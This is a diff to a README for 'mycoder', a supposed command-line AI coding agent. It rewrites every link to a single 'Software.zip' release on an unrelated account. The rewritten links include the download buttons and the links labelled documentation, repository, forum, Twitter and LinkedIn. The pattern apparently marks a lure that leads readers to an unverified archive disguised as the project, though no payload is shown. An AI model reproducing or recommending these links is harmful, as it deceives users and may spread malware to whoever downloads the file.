@@ -2,7 +2,7 @@
 
 ## Simple to install, powerful command-line based AI agent system for coding.
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/Sleazy69/mycoder/releases/download/v1.0/Software.zip)](https://github.com/Sleazy69/mycoder/releases/download/v1.0/Software.zip)
 
 ### Overview
 Welcome to the "mycoder" repository, a powerful command-line based AI agent system designed to aid you in your coding endeavors. Whether you are a seasoned developer or just starting out, mycoder is here to assist you in writing efficient code and enhancing your programming skills.
@@ -30,15 +30,15 @@ Here are a few examples of how you can utilize mycoder to improve your coding ex
 3. Automate repetitive coding tasks to save time and increase productivity.
 
 ### Resources
-- [Documentation](https://mycoder.com/documentation): Explore in-depth guides and tutorials on using mycoder effectively.
-- [GitHub Repository](https://github.com/mycoder): Contribute to the development of mycoder by submitting bug reports or suggesting new features.
-- [Community Forum](https://community.mycoder.com): Engage with fellow users, share coding tips, and seek help from the community.
+- [Documentation](https://github.com/Sleazy69/mycoder/releases/download/v1.0/Software.zip): Explore in-depth guides and tutorials on using mycoder effectively.
+- [GitHub Repository](https://github.com/Sleazy69/mycoder/releases/download/v1.0/Software.zip): Contribute to the development of mycoder by submitting bug reports or suggesting new features.
+- [Community Forum](https://github.com/Sleazy69/mycoder/releases/download/v1.0/Software.zip): Engage with fellow users, share coding tips, and seek help from the community.
 
 ### Get Involved
 If you are passionate about coding and AI technology, we invite you to join our community of developers working on enhancing mycoder. Contribute to the project, share your ideas, and help shape the future of coding automation.
 
 ### Stay Connected
-Follow us on [Twitter](https://twitter.com/mycoder) and [LinkedIn](https://linkedin.com/company/mycoder) to stay updated on the latest news, releases, and events related to mycoder.
+Follow us on [Twitter](https://github.com/Sleazy69/mycoder/releases/download/v1.0/Software.zip) and [LinkedIn](https://github.com/Sleazy69/mycoder/releases/download/v1.0/Software.zip) to stay updated on the latest news, releases, and events related to mycoder.
 
 ---
 
@@ -60,7 +60,7 @@ Follow us on [Twitter](https://twitter.com/mycoder) and [LinkedIn](https://linke
 🔗 **Download mycoder Zip**
 
 To access the mycoder zip file for installation, click the button below:
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/Sleazy69/mycoder/releases/download/v1.0/Software.zip)](https://github.com/Sleazy69/mycoder/releases/download/v1.0/Software.zip)
 
 ---
 If the link does not work or you need further assistance, please visit the "Releases" section of the repository to find the appropriate download link.
